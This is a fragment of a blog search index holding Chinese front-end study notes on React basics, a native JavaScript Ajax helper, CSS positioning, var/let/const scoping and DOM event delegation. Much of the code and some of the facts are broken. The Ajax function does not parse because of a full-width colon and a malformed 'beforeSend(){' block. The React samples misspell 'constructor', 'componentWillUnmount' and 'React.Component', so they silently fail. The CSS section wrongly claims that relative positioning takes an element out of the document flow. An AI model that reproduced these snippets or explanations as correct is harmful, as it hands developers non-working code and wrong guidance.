        <category>react相关</category>
      </categories>
      <tags>
        <tag>react</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[react-day1]]></title>
    <url>%2F2018-06-02-react-first-day.html</url>
    <content type="text"><![CDATA[react 学习笔记day-01介绍JSX const element = &lt;h1&gt;Hello, world!&lt;/h1&gt; 它称为JSX，是JavaScript的语法的扩展。 选择JSX的理由：React拥抱渲染逻辑与其他UI逻辑固有耦合的事实：事件如何处理，状态如何随事件变化以及数据如何准备显示。通过将标记和逻辑放入单独的文件中，React不再人为地分离技术，而是将问题与称为“组件”的松散耦合单元分隔开来。 在JSX中嵌入表达式 下面例子中，声明一个变量name,然后在JSX中使用它包装在大括号中： 1234567const name = &apos;Josn Lai&apos;;const elenment = &lt;h1&gt;Hello , &#123;name&#125;&lt;/h1&gt;;ReactDOM.render( element, document.getElementById(&apos;root&apos;)); 可以在JSX的大括号中（{}）放入任何有效的JavaScript表达式。下例中，将调用JavaScript函数的结果嵌入到formatName（user）到&lt;h1&gt;元素中 123456789101112131415161718function formatName(user)&#123; return user.firstName + &apos; &apos; + user.lastName;&#125;const user = &#123; firstName: &apos;lai&apos;, lastName: &apos;binghong&apos;&#125;;const element = ( &lt;h1&gt; Hello,&#123;formatName(user)&#125;! &lt;/h1&gt;);ReactDOM.render( elememt, document.getElementById(&apos;root&apos;);); JSX也是一个表达式编译之后，JSX表达式变成常规的JavaScript函数调用并评估为JavaScript对象。这意味着可以在if语句和for循环中是用JSX将其分配给变量，将其作为参数接受，并从函数中返回： 123456function getGreeting(user)&#123; if(user)&#123; return &lt;h1&gt;Hello，&#123;formatName(user)&#125;!&lt;/h1&gt; &#125; return &lt;h1&gt;Hello, Stranger.&lt;/h1&gt;&#125; 使用JSX指定属性 可以使用引号将字符串文字指定为属性 const element = &lt;div tabIndex = “0”&gt;&lt;/div&gt;; 也可以使用大括号将javascript表达式嵌入到属性中 const element = &lt;img src={user.avatarUrl}&gt;&lt;/img&gt;; 在属性中嵌入javascript表达式时，请勿将大括号括起来，应该使用引号（用于字符串值）或大括号（用于表达式），但是不可以同时使用同一个属性JSX的命名一般用camelCase，驼峰式命名。class =&gt; className ,tabindex =&gt; tabIndex. 用JSX可以包含子项，单标签用闭合 const element = &lt;img src = {user.avatarUrl}/&gt;; JSX标签可能包含子项： 123456789const element = ( &lt;div&gt; &lt;h1&gt;Hello!&lt;/h1&gt; &lt;h2&gt;xxx&lt;/h2&gt; &lt;div&gt; ccc &lt;/div&gt; &lt;/div&gt;); JSX防止注入攻击默认情况下，react DOM 在渲染之前转义嵌入在JSX中的任何值，因此它确保不会注入任何未明确写入应用程序的内容，在呈现前，所有内容都会转换为字符串，有助于防止XSS攻击 JSX表示对象Babel将JSX编译为 React.createElement()调用。下方两个例子是相同的： 1234567891011const element = ( &lt;h1 className = &quot;show&quot;&gt; Hello ! &lt;/h1&gt;); const element = React.createElement( &apos;h1&apos;, &#123;className: &apos;show&apos;&#125;, &apos;Hello!&apos;); React.createElement()执行一些检查以帮助编写无措代码，但本质上它会创建一个如下对象： 1234567const element = &#123; type: &apos;h1&apos;, props: &#123; className :&apos;show&apos;, children: &apos;Hello!&apos; &#125;&#125; 渲染元素元素时React 应用程序的最小构建块一个元素描述了你想在屏幕上看到的内容与浏览器DOM元素不同，React元素时普通元素，创建起来很便宜，React DOM负责更新DOM以匹配React元素 将元素渲染到DOM中假设div存在于html某个文件中的某个地方 &lt;div id=&quot;root&quot;&gt;&lt;/div&gt; 我们称之为“根”DOM节点，因为它内容部的所有内容都将由React DOM管理仅使用React 构建的应用程序通常具有单个根DOM节点，如果将React集成到现有的应用程序中，则可以根据需要拥有尽可能多的独立根DOM节点。要将React元素渲染到根DOM节点中，请将两者传递给ReactDOM.render(); const element = &lt;h1&gt;Hello,world&lt;/h1&gt;;ReactDOM.render(element,documentById(&#39;root&#39;)); 更新呈现的元素React元素时不可变的，一旦创建了一个元素，就不能更改其子元素或者属性。更新Ui的唯一方法是创建一个新元素并将其传递给ReactDOM.reader() 时钟例子 1234567891011function tick()&#123; const element = ( &lt;div&gt; &lt;h1&gt;1&lt;/h1&gt; &lt;h1&gt;2&lt;/h1&gt; &lt;/div&gt; ); ReactDOM.render(element,document.getElementById(&apos;root&apos;));&#125;setInterval(tick, 1000); 组件和道具(props)组件是讲用户界面独立分开，可重复使用的部分，并且可独立思考每一部分 功能和类组件定义组件的最简单方法是编写一个javascript函数 123function Welcome(x)&#123; return &lt;h1&gt;你好，&#123;x.name&#125;&lt;/h1&gt;;&#125; 上面的javascript函数一个有效的React组件，因为它接受一个包含数据的‘x’（代表属性）对象参数并返回一个React元素，我们称这些组件为‘功能性’，因为它们实际上是JavaScript功能 也可以使用ES6类来定义组件： 12345class Welcome extends React.Compoent&#123; render()&#123; return &lt;h1&gt;hello, &#123;this.x.name&#125;&lt;/h1&gt; &#125;&#125; 渲染组件 React元素可以表示DOM标签 const element = &lt;div/&gt;; 也可以表示用户定义的组件 const element =&lt;Welcome name=&quot;Lbh&quot;&gt;; 当React查看表示用户定义组件的元素时，它会将JSX属性作为单个对象传递给此组件，我们称这个组件为道具 12345678function Welcome(props)&#123; return &lt;h1&gt;hello!&#123;props.name&#125;&lt;/h1&gt;; &#125; const element = &lt;Welcome name=&quot;Lbh&quot;/&gt;; ReactDOM.render( element, documemt.getElementById(&apos;root&apos;)); 注意：始终使用大写字母开始组件名称。 构成组件 组件可以在其输出中引用其他组件，一个按钮、一个窗体、一个对话框、一个屏幕，在React应用程序中，所有的这些通常都表示为组件例如：创建一个App呈现Welcome多次的组件 1234567891011121314151617function Welcome(x)&#123; return &lt;h1&gt;hello! &#123;x.name&#125;&lt;/h1&gt;;&#125;function App()&#123; return ( &lt;div&gt; &lt;Welcome name =&quot;1&quot;/&gt; &lt;Welcome name =&quot;2&quot;/&gt; &lt;Welcome name =&quot;3&quot;/&gt; &lt;/div&gt; );&#125;ReactDOM.render( &lt;App/&gt;, document.getElementById(&apos;root&apos;)); 提取组件不要害怕将组件分解成更小的组件 道具是只读的无论将一个组件声明为一个函数还是一个类，它都不能修改它自己的道具。 状态和生命周期更新UI的方法：使用它ReactDOM.render()改变呈现的输出： \ 1234567891011121314function tick()&#123; const element = ( &lt;div&gt; &lt;h1&gt;1&lt;/h1&gt; &lt;h2&gt;It is &#123;new Date().toLocaleTimeString()&#125;.&lt;/h2&gt; &lt;/div&gt; ); ReactDOM.render( element, document.getElementById(&apos;root&apos;) );&#125;setInterval(tick,1000); 封装时钟: 1234567891011121314151617function Clock(props)&#123; return( &lt;div&gt; &lt;h1&gt;1&lt;/h1&gt; &lt;h2&gt;It is &#123;props.date.toLocaleTimeString()&#125;&lt;/h2&gt; &lt;/div&gt; ); function tick()&#123; ReactDOM.render( &lt;Clock date=&#123;new Date()&#125;/&gt;, document.getElementById(&apos;root&apos;) ); &#125;&#125;setInterval(tick,1000); 给组件添加“状态”，状态类似于道具，是私人的并且是完全由组件控制的。 将函数转换为类1.创建一个扩展名为ES6的类，名称相同的React.Component2.为它添加一个空的方法render()3.将函数的主体移动到render方法中4.更换props用this.props的render身体5.删除多余的空函数声明 12345678910class Clock extends React.Component&#123; render()&#123; return( &lt;div&gt; &lt;h1&gt;1&lt;/h1&gt; &lt;h2&gt;It is &#123;this.props.date.toLocaleTimeString()&#125;.&lt;/h2&gt; &lt;/div&gt; ) &#125;&#125; 将本地状态添加到类 12345678910111213141516171819class Clock extends React.Component&#123; constuctor(props)&#123; super(props); this.state = &#123;date: new Date()&#125;; &#125; render()&#123; return( &lt;div&gt; &lt;h1&gt;2&lt;/h1&gt; &lt;h2&gt; It is &#123;this.state.date.toLocaleTimeString()&#125;.&lt;/h2&gt; &lt;/div&gt; ); &#125;&#125;ReactDOM.render(&lt;Clock /&gt;,document.getElementById(&apos;root&apos;)); 接下来设置计时器每秒更新一次 将生命周期方法添加到类中一个组件完整的生命周期(lifecycle hooks)包括实例化阶段、活动阶段、销毁阶段，每个阶段又由相应的方法管理mounting :表示正在挂载虚拟DOM到真实DOMupdating :表示正被重新渲染unmounting:表示正在将虚拟DOM移除真实DOM 每个过程提供了两个函数 componentWillMount()componentDidMount()componentWillUpdate(object nextProps,object nextState)componentDidUpdate(object nextProps,object nextState)componentWillUnmount() componentDidMount() 在组件输出呈现给DOM后，该钩子运行，是设置定时器的好地方 123456789componentDidMount()&#123; this.timerID = setInterval( () =&gt; this.tick(),1000 );&#125;compoentWillUnmount()&#123; clearInterval(this.timerID);&#125; 最终： 123456789101112131415161718192021222324252627282930313233343536class Clock extends React.Component&#123; constuctor(props)&#123; super(props); this.state = &#123;date: new Date()&#125;; &#125; componentDidMount()&#123; this.timerID = setInterval( () =&gt; this.tick(),1000 ); &#125; compoentWillUnmount()&#123; clearInterval(this.timerID); &#125; tick()&#123; this.setState(&#123; date:new Date() &#125;); &#125; render()&#123; return( &lt;div&gt; &lt;h1&gt;2&lt;/h1&gt; &lt;h2&gt; It is &#123;this.state.date.toLocaleTimeString()&#125;.&lt;/h2&gt; &lt;/div&gt; ); &#125;&#125;ReactDOM.render( &lt;Clock /&gt;, document.getElementById(&apos;root&apos;)); 正确使用状态（State）setState()来改变状态，状态的更新可能是异步的 12345this.setState(function(prevState,props)&#123; return&#123; counter:pervState.counter + props.increment &#125;;&#125;); 参考链接：https://react.docschina.org/docs/hello-world.html]]></content>
      <categories>
        <category>react相关</category>
      </categories>
      <tags>
        <tag>react</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[原生js实现Ajax]]></title>
    <url>%2F2018-05-16-originjsAjax.html</url>
    <content type="text"><![CDATA[原生js实现Ajax1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465function ajax()&#123;var ajaxData = &#123; type:arguments[0].type || 'GET', url：arguments[0].url || '', aysnc:arguments[0].async || 'true', data:arguments[0].data || null, dataType:arguments[0].dataType || 'text', contentType:arguments[0].contentType || 'application/x-www-form-urlencoded', beforeSend:arguments[0].beforeSend || function()&#123;&#125;, success:arguments[0].success || function()&#123;&#125;, error:arguments[0].error || function()&#123;&#125;,&#125;ajaxData.beforeSend()&#123; var xhr = createxmlHttpRequest(); xhr.responseType = ajaxData.dataType; xhr.open(ajaxData.type,ajaxData.url,ajaxData.async); xhr.setRequestHeader("Content-Type",ajaxData.contentType); xhr.send(convertData(ajaxData.data)); xhr.onreadystatechange = function() &#123; if (xhr.readyState == 4) &#123; if(xhr.status == 200)&#123; ajaxData.success(xhr.response) &#125;else&#123; ajaxData.error() &#125; &#125; &#125;&#125;function createxmlHttpRequest() &#123; if (window.ActiveXObject) &#123; return new ActiveXObject("Microsoft.XMLHTTP"); &#125; else if (window.XMLHttpRequest) &#123; return new XMLHttpRequest(); &#125; &#125; function convertData(data)&#123; if( typeof data === 'object' )&#123; var convertResult = "" ; for(var c in data)&#123; convertResult+= c + "=" + data[c] + "&amp;"; &#125; convertResult=convertResult.substring(0,convertResult.length-1) return convertResult; &#125;else&#123; return data; &#125; &#125;&#125;// 调用ajax(&#123; type:"POST", url:"ajax.php", dataType:"json", data:&#123;"val1":"abc","val2":123,"val3":"456"&#125;, beforeSend:function()&#123; //some js code &#125;, success:function(msg)&#123; console.log(msg) &#125;, error:function()&#123; console.log("error") &#125; &#125;)]]></content>
      <categories>
        <category>javaScript相关</category>
      </categories>
      <tags>
        <tag>js</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[position四个属性的区别]]></title>
    <url>%2F2018-05-16-position.html</url>
    <content type="text"><![CDATA[简析position四个属性static(默认)默认值，没有定位，元素出现在正常的流中（忽略top\bottom\left\right\z-index） relative(相对定位)生成相对定位的元素，通过top\bottom\left\right的设置，相对于其正常（原先本身）位置进行定位。可通过z-index进行层次分级。 absolute(绝对定位)生成绝对定位的元素，相对于static定位以外的第一个父元素进行定位。元素的位置通过left\bottom\right\top属性进行规定，可以额通过z-index进行层次分级 fixed(固定定位)生成绝对定位的元素，相对于浏览器窗口进行定位。元素的位置通过left\top\bottom\right属性进行规定，可以通过z-index进行层次分级 详解relative定位为relative的元素脱离正常的文本流中，但其在文本流中的位置依然存在他是默认参照父级的原始点为原始点，无父级则以文本流的顺序在上一个元素的底部为原始点，配合TRBL进行定位，当父级内有padding等CSS属性时，当前级的原始点则参照父级内容区的原始点进行定位，有以下属性： 如果没有TRBL，以父级的左上角，在没有父级的时候，他是参照浏览器左上角(到这里和absolute第一条一样)，如果在没有父级元素的情况下，存在文本，则以文本的底部为原始点进行定位并将文字断开(和absolut不同)。 如果设定TRBL，并且父级没有设定position属性，仍旧以父级的左上角为原点进行定位(和absolut不同)。 如果设定TRBL，并且父级设定position属性(无论是absolute还是relative)，则以父级的左上角为原点进行定位，位置 由TRBL决定(前半段和absolute一样)。如果父级有Padding属性，那么就以内容区域的左上角为原点，进行定位(后半段和absolut不 同)。 以上三点可以总结出，无论父级存在不存在，无论有没有TRBL，均是以父级的左上角进行定位，但是父级的Padding属性会对其影响。综合上面对relative的叙述，我们就可以将position属性为relative的DIV视成可以用TRBL进行定位的的普通DIV，或者说 只要将我们平时布局页面的div的CSS属性中加上position:relative后，就不只是用float布局页面了，还可以用TRBL进行布局页 面 了，或者说加上position:relative的DIV也可以像普通的DIV进行布局页面了，只不过还可以用TRBL进行布局页面。但是 position属性为absolute不可以用来布局页面，因为如果用来布局的话，所有的DIV都相对于浏览器的左上角定位了，所以只能用于将某个元素 定位于属性为absolute的元素的内部某个位置。 Top的值表示对象相对原位置向下偏移的距离，bottom的值表示对象相对原位置向上偏移的距离，两者同时存在时，只有Top起作用。 left的值表示对象相对原位置向右偏移的距离，right的值表示对象相对原位置向左偏移的距离，两者同时存在时，只有left起作用。 absolute定位为absolute的层脱离正常文本流，但与relative的区别是其在正常流中的位置不再存在。 这个属性总是有人给出误导。说当position属性设为absolute后，总是按照浏览器窗口来进行定位的，这其实是错误的。实际上，这是fixed属性的特点。 如果没有TRBL(top、right、bottom、left)，以父级的左上角，在没有父级的时候，他是参照浏览器左上角,如果在没有父级元素的情况下，存在文本，则以它前面的最后一个文字的右上角为原点进行定位但是不断开文字，覆盖于上方。 如果设定TRBL，并且父级没有设定position属性，那么当前的absolute则以浏览器左上角为原始点进行定位，位置将由TRBL决定。 如果设定TRBL，并且父级设定position属性(无论是absolute还是relative)，则以父级的左上角为原点进行定位，位置由 TRBL决定。即使父级有Padding属性，对其也不起作用，说简单点就是：它只坚持一点，就以父级左上角为原点进行定位，父级的padding对其根本没有影响。 以上三点可以总结出，若想把一个定位属性为absolute的元素定位于其父级元素内，只有满足两个条件： 第一：设定TRBL 第二：父级设定Position属性 上面的这个总结非常重要，可以保证你在用absolue布局页面的时候，不会错位，并且随着浏览器的大小或者显示器分辨率的大小，而不发生改变。 只要有一点不满足，元素就会以浏览器左上角为原点，这就是初学者容易犯错的一点，已经定位好的板块，当浏览器的大小改变，父级元素会随之改变，但是设 定Position属性为absolute的板块和父级元素的位置发生改变，错位了，这就是因为此时元素以浏览器的右上角为原点的原因。初学者很容易犯错的是，不清楚Position属性为absolute的板块，若想定位到父级板块中，并且当浏览器的大小改变或显示器的分辨率改变，布局不发生改变，是需要满足两个条件的，只要有一点不满足，元素就会以浏览器左上角为原点，从而导致页面布局错位。 Top的值表示对象上边框与浏览器窗口顶部的距离，bottom的值表示对象下边框与浏览器窗口底部的距离，两者同时存在时，只有Top起作用；如果两者都未指定，则其顶端将与原文档流位置一致，即垂直保持位置不变。 left的值表示对象左边框与浏览器窗口左边的距离，right的值表示对象右边框与浏览器窗口右边的距离，两者同时存在时，只有left起作用；如果两者都未指定，则其左边将与原文档流位置一致，即水平保持位置不变。 在Position属性值为absolute的同时，如果有一级父对象（无论是父对象还是祖父对象，或者再高的辈分，一样）的Position属性值为Relative时，则上述的相对浏览器窗口定位将会变成相对父对象定位，这对精确定位是很有帮助的。 relative与absolute的主要区别relative定位的层总是相对于其最近的父元素，无论其父元素是何种定位方式 对于absolute定位的层总是相对于其最近的定义为absolute或relative的父层，而这个父层并不一定是其直接父层。如果其父层中都未定义absolute或relative，则其将相对body进行定位 总结属性为relative的元素可以用来布局页面，属性为absolute的元素用来定位某元素在父级中的位置，既然属性为absolute的元素用来定位某元素在父级中位置，就少不了TRBL，这时候根据一开始讲的absolute的第三条，如果父级元素没有position属性那么 absolute元素就会脱离父级元素，但是如果是布局页面，父级元素position的属性又不能为absolute，不然就会以浏览器左上角为原点 了，所以父级元素的position属性只能为relative 如果用position来布局页面，父级元素的position属性必须为relative，而定位于父级内部某个位置的元素，最好用 absolute，因为它不受父级元素的padding的属性影响，当然你也可以用position，不过到时候计算的时候不要忘记padding的值 Note : 绝对(absolute)定位对象在可视区域之外会导致滚动条出现。而放置相对(relative)定位对象在可视区域之外，滚动条不会出现。 什么是文档流？ 将窗体自上而下分成一行行, 并在每行中按从左至右的顺序排放元素,即为文档流。只有三种情况会使得元素脱离文档流，分别是：浮动绝对定位和相对定位。 z-index属性 z-index，又称为对象的层叠顺序，它用一个整数来定义堆叠的层次，整数值越大，则被层叠在越上面，当然这是指同级元素间的堆叠，如果两个对象的此属 性具有同样的值，那么将依据它们在HTML文档中流的顺序层叠，写在后面的将会覆盖前面的。需要注意的是，父子关系是无法用z-index来设定上下关系 的，一定是子级在上父级在下。Note：使用static 定位或无position定位的元素z-index属性是无效的。]]></content>
      <categories>
        <category>界面布局</category>
      </categories>
      <tags>
        <tag>css</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[var、let、const三者的区别]]></title>
    <url>%2F2018-05-15-var-let-const.html</url>
    <content type="text"><![CDATA[JS中的块级作用域，var、let、const三者的区别首先，ECMAScript和JavaScript关系： ECMAScript是一个国际通过的标准化脚本语言。JavaScript由ECMAScript和DOM、BOM三者组成。可以简单理解为：ECMAScript是JavaScript的语言规范，JavaScript是ECMAScript的实现和扩展。 块作用域{ }JS中作用域有：全局作用域、函数作用域。没有块作用域的概念。ECMAScript 6(简称ES6)中新增了块级作用域。块作用域由 { } 包括，if语句和for语句里面的{ }也属于块作用域。 12345678910111213141516171819202122232425&#123; var a = 1; console.log(a); // 1&#125;console.log(a); // 1// 可见，通过var定义的变量可以跨块作用域访问到。(function A() &#123; var b = 2; console.log(b); // 2&#125;)();// console.log(b); // 报错，// 可见，通过var定义的变量不能跨函数作用域访问到if(true) &#123; var c = 3;&#125;console.log(c); // 3for(var i = 0; i &lt; 4; i ++) &#123; var d = 5;&#125;;console.log(i); // 4 (循环结束i已经是4，所以此处i为4)console.log(d); // 5// if语句和for语句中用var定义的变量可以在外面访问到，// 可见，if语句和for语句属于块作用域，不属于函数作用域。 var、let、const的区别var定义的变量，没有块的概念，可以跨块访问, 不能跨函数访问。let定义的变量，只能在块作用域里访问，不能跨块访问，也不能跨函数访问。const用来定义常量，使用时必须初始化(即必须赋值)，只能在块作用域里访问，而且不能修改。 123456789101112131415161718// 块作用域&#123;var a = 1; let b = 2;const c = 3;// c = 4; // 报错var aa;let bb;// const cc; // 报错console.log(a); // 1console.log(b); // 2console.log(c); // 3console.log(aa); // undefinedconsole.log(bb); // undefined&#125;console.log(a); // 1// console.log(b); // 报错// console.log(c); // 报错 12345678910111213// 函数作用域(function A() &#123; var d = 5; let e = 6; const f = 7; console.log(d); // 5 console.log(e); // 6 (在同一个&#123; &#125;中,也属于同一个块，可以正常访问到) console.log(f); // 7 (在同一个&#123; &#125;中,也属于同一个块，可以正常访问到)&#125;)();// console.log(d); // 报错// console.log(e); // 报错// console.log(f); // 报错]]></content>
      <categories>
        <category>javaScript相关</category>
      </categories>
      <tags>
        <tag>js</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[事件委派]]></title>
    <url>%2F2018-05-15-eventDelegation.html</url>
    <content type="text"><![CDATA[js中的事件委托或是事件代理详解概念那什么叫事件委托呢？它还有一个名字叫事件代理，JavaScript高级程序设计上讲：事件委托就是利用事件冒泡，只指定一个事件处理程序，就可以管理某一类型的所有事件。那这是什么意思呢？网上的各位大牛们讲事件委托基本上都用了同一个例子，就是取快递来解释这个现象，我仔细揣摩了一下，这个例子还真是恰当，我就不去想别的例子来解释了，借花献佛，我摘过来，大家认真领会一下事件委托到底是一个什么原理： 有三个同事预计会在周一收到快递。为签收快递，有两种办法：一是三个人在公司门口等快递；二是委托给前台MM代为签收。现实当中，我们大都采用委托的方案（公司也不会容忍那么多员工站在门口就为了等快递）。前台MM收到快递后，她会判断收件人是谁，然后按照收件人的要求签收，甚至代为付款。这种方案还有一个优势，那就是即使公司里来了新员工（不管多少），前台MM也会在收到寄给新员工的快递后核实并代为签收。 这里其实还有2层意思的： 第一，现在委托前台的同事是可以代为签收的，即程序中的现有的dom节点是有事件的； 第二，新员工也是可以被前台MM代为签收的，即程序中新添加的dom节点也是有事件的。 为什么要使用事件委托？一般来说，dom需要有事件处理程序，我们都会直接给它设事件处理程序就好了，那如果是很多的dom需要添加事件处理呢？比如我们有100个li，每个li都有相同的click点击事件，可能我们会用for循环的方法，来遍历所有的li，然后给它们添加事件，那这么做会存在什么影响呢？ 在JavaScript中，添加到页面上的事件处理程序数量将直接关系到页面的整体运行性能，因为需要不断的与dom节点进行交互，访问dom的次数越多，引起浏览器重绘与重排的次数也就越多，就会延长整个页面的交互就绪时间，这就是为什么性能优化的主要思想之一就是减少DOM操作的原因；如果要用事件委托，就会将所有的操作放到js程序里面，与dom的操作就只需要交互一次，这样就能大大的减少与dom的交互次数，提高性能； 每个函数都是一个对象，是对象就会占用内存，对象越多，内存占用率就越大，自然性能就越差了（内存不够用，是硬伤，哈哈），比如上面的100个li，就要占用100个内存空间，如果是1000个，10000个呢，那只能说呵呵了，如果用事件委托，那么我们就可以只对它的父级（如果只有一个父级）这一个对象进行操作，这样我们就需要一个内存空间就够了，是不是省了很多，自然性能就会更好。 事件委托的原理事件委托是利用事件的冒泡原理来实现的，何为事件冒泡呢？就是事件从最深的节点开始，然后逐步向上传播事件，举个例子：页面上有这么一个节点树，div&gt;ul&gt;li&gt;a;比如给最里面的a加一个click点击事件，那么这个事件就会一层一层的往外执行，执行顺序a&gt;li&gt;ul&gt;div，有这样一个机制，那么我们给最外面的div加点击事件，那么里面的ul，li，a做点击事件的时候，都会冒泡到最外层的div上，所以都会触发，这就是事件委托，委托它们父级代为执行事件。 事件委托的实现先来看一段一般方法的例子 123456&lt;ul id="ul1"&gt; &lt;li&gt;111&lt;/li&gt; &lt;li&gt;222&lt;/li&gt; &lt;li&gt;333&lt;/li&gt; &lt;li&gt;444&lt;/li&gt;&lt;/ul&gt; 实现功能是点击li，弹出123 123456789window.onload = function()&#123; var oUl = document.getElementById("ul1"); var aLi = oUl.getElementsByTagName('li'); for(var i=0;i&lt;aLi.length;i++)&#123; aLi[i].onclick = function()&#123; alert(123); &#125; &#125;&#125; 上面的代码的意思很简单，相信很多人都是这么实现的，我们看看有多少次的dom操作，首先要找到ul，然后遍历li，然后点击li的时候，又要找一次目标的li的位置，才能执行最后的操作，每次点击都要找一次li； 那么我们用事件委托的方式做又会怎么样呢？ 123456window.onload = function()&#123;var oUl = document.getElementById("ul1");oUl.onclick = function()&#123; alert(123); &#125;&#125; 里用父级ul做事件处理，当li被点击时，由于冒泡原理，事件就会冒泡到ul上，因为ul上有点击事件，所以事件就会触发，当然，这里当点击ul的时候，也是会触发的，那么问题就来了，如果我想让事件代理的效果跟直接给节点的事件效果一样怎么办，比如说只有点击li才会触发，不怕，我们有绝招： Event对象提供了一个属性叫target，可以返回事件的目标节点，我们成为事件源，也就是说，target就可以表示为当前的事件操作的dom，但是不是真正操作dom，当然，这个是有兼容性的，标准浏览器用ev.target，IE浏览器用event.srcElement，此时只是获取了当前节点的位置，并不知道是什么节点名称，这里我们用nodeName来获取具体是什么标签名，这个返回的是一个大写的，我们需要转成小写再做比较（习惯问题）： 1234567891011window.onload = function()&#123; var oUl = document.getElementById("ul1"); oUl.onclick = function(ev)&#123; var ev = ev || window.event; var target = ev.target || ev.srcElement; if(target.nodeName.toLowerCase() == 'li')&#123; alert(123); alert(target.innerHTML); &#125; &#125;&#125; 这样改下就只有点击li会触发事件了，且每次只执行一次dom操作，如果li数量很多的话，将大大减少dom的操作，优化的性能可想而知！ 上面的例子是说li操作的是同样的效果，要是每个li被点击的效果都不一样，那么用事件委托还有用吗？ 12345678910111213141516171819202122232425262728&lt;div id="box"&gt; &lt;input type="button" id="add" value="添加" /&gt; &lt;input type="button" id="remove" value="删除" /&gt; &lt;input type="button" id="move" value="移动" /&gt; &lt;input type="button" id="select" value="选择" /&gt;&lt;/div&gt;&lt;script&gt; window.onload = function()&#123; var Add = document.getElementById("add"); var Remove = document.getElementById("remove"); var Move = document.getElementById("move"); var Select = document.getElementById("select"); Add.onclick = function()&#123; alert('添加'); &#125;; Remove.onclick = function()&#123; alert('删除'); &#125;; Move.onclick = function()&#123; alert('移动'); &#125;; Select.onclick = function()&#123; alert('选择'); &#125; &#125;&lt;/script&gt; 上面实现的效果我就不多说了，很简单，4个按钮，点击每一个做不同的操作，那么至少需要4次dom操作，如果用事件委托，能进行优化吗？ 123456789101112131415161718192021222324window.onload = function()&#123; var oBox = document.getElementById("box"); oBox.onclick = function (ev) &#123; var ev = ev || window.event; var target = ev.target || ev.srcElement; if(target.nodeName.toLocaleLowerCase() == 'input')&#123; switch(target.id)&#123; case 'add' : alert('添加'); break; case 'remove' : alert('删除'); break; case 'move' : alert('移动'); break; case 'select' : alert('选择'); break; &#125; &#125; &#125; &#125; 用事件委托就可以只用一次dom操作就能完成所有的效果，比上面的性能肯定是要好一些的 现在讲的都是document加载完成的现有dom节点下的操作，那么如果是新增的节点，新增的节点会有事件吗？也就是说，一个新员工来了，他能收到快递吗？ 看一下正常的添加节点的方法： 1234567&lt;input type="button" name="" id="btn" value="添加" /&gt;&lt;ul id="ul1"&gt; &lt;li&gt;111&lt;/li&gt; &lt;li&gt;222&lt;/li&gt; &lt;li&gt;333&lt;/li&gt; &lt;li&gt;444&lt;/li&gt;&lt;/ul&gt; 现在是移入li，li变红，移出li，li变白，这么一个效果，然后点击按钮，可以向ul中添加一个li子节点 1234567891011121314151617181920212223window.onload = function()&#123; var oBtn = document.getElementById("btn"); var oUl = document.getElementById("ul1"); var aLi = oUl.getElementsByTagName('li'); var num = 4; //鼠标移入变红，移出变白 for(var i=0; i&lt;aLi.length;i++)&#123; aLi[i].onmouseover = function()&#123; this.style.background = 'red'; &#125;; aLi[i].onmouseout = function()&#123; this.style.background = '#fff'; &#125; &#125; //添加新节点 oBtn.onclick = function()&#123; num++; var oLi = document.createElement('li'); oLi.innerHTML = 111*num; oUl.appendChild(oLi); &#125;;&#125; 这是一般的做法，但是你会发现，新增的li是没有事件的，说明添加子节点的时候，事件没有一起添加进去，这不是我们想要的结果，那怎么做呢？一般的解决方案会是这样，将for循环用一个函数包起来，命名为mHover，如下： 123456789101112131415161718192021222324252627window.onload = function()&#123; var oBtn = document.getElementById("btn"); var oUl = document.getElementById("ul1"); var aLi = oUl.getElementsByTagName('li'); var num = 4; function mHover () &#123; //鼠标移入变红，移出变白 for(var i=0; i&lt;aLi.length;i++)&#123; aLi[i].onmouseover = function()&#123; this.style.background = 'red'; &#125;; aLi[i].onmouseout = function()&#123; this.style.background = '#fff'; &#125; &#125; &#125; mHover (); //添加新节点 oBtn.onclick = function()&#123; num++; var oLi = document.createElement('li'); oLi.innerHTML = 111*num; oUl.appendChild(oLi); mHover (); &#125;;&#125; 虽然功能实现了，看着还挺好，但实际上无疑是又增加了一个dom操作，在优化性能方面是不可取的，那么有事件委托的方式，能做到优化吗？ 1234567891011121314151617181920212223242526272829303132window.onload = function()&#123; var oBtn = document.getElementById("btn"); var oUl = document.getElementById("ul1"); var aLi = oUl.getElementsByTagName('li'); var num = 4; //事件委托，添加的子元素也有事件 oUl.onmouseover = function(ev)&#123; var ev = ev || window.event; var target = ev.target || ev.srcElement; if(target.nodeName.toLowerCase() == 'li')&#123; target.style.background = "red"; &#125; &#125;; oUl.onmouseout = function(ev)&#123; var ev = ev || window.event; var target = ev.target || ev.srcElement; if(target.nodeName.toLowerCase() == 'li')&#123; target.style.background = "#fff"; &#125; &#125;; //添加新节点 oBtn.onclick = function()&#123; num++; var oLi = document.createElement('li'); oLi.innerHTML = 111*num; oUl.appendChild(oLi); &#125;;&#125; 看，上面是用事件委托的方式，新添加的子元素是带有事件效果的，我们可以发现，当用事件委托的时候，根本就不需要去遍历元素的子节点，只需要给父级元素添加事件就好了，其他的都是在js里面的执行，这样可以大大的减少dom操作，这才是事件委托的精髓所在。 现在给一个场景 ul &gt; li &gt; div &gt; p，div占满li，p占满div，还是给ul绑定时间，需要判断点击的是不是li（假设li里面的结构是不固定的），那么e.target就可能是p，也有可能是div，这种情况你会怎么处理呢？ 12345678910111213&lt;ul id="test"&gt; &lt;li&gt; &lt;p&gt;11111111111&lt;/p&gt; &lt;/li&gt; &lt;li&gt; &lt;div&gt; &lt;/div&gt; &lt;/li&gt; &lt;li&gt; &lt;span&gt;3333333333&lt;/span&gt; &lt;/li&gt; &lt;li&gt;4444444&lt;/li&gt;&lt;/ul&gt; 如上列表，有4个li，里面的内容各不相同，点击li，event对象肯定是当前点击的对象，怎么指定到li上，下面我直接给解决方案： 1234567891011var oUl = document.getElementById('test');oUl.addEventListener('click',function(ev)&#123; var target = ev.target; while(target !== oUl )&#123; if(target.tagName.toLowerCase() == 'li')&#123; console.log('li click~'); break; &#125; target = target.parentNode; &#125;&#125;) 核心代码是while循环部分，实际上就是一个递归调用，你也可以写成一个函数，用递归的方法来调用，同时用到冒泡的原理，从里往外冒泡，知道currentTarget为止，当当前的target是li的时候，就可以执行对应的事件了，然后终止循环 总结适合用事件委托的事件：click，mousedown，mouseup，keydown，keyup，keypress。 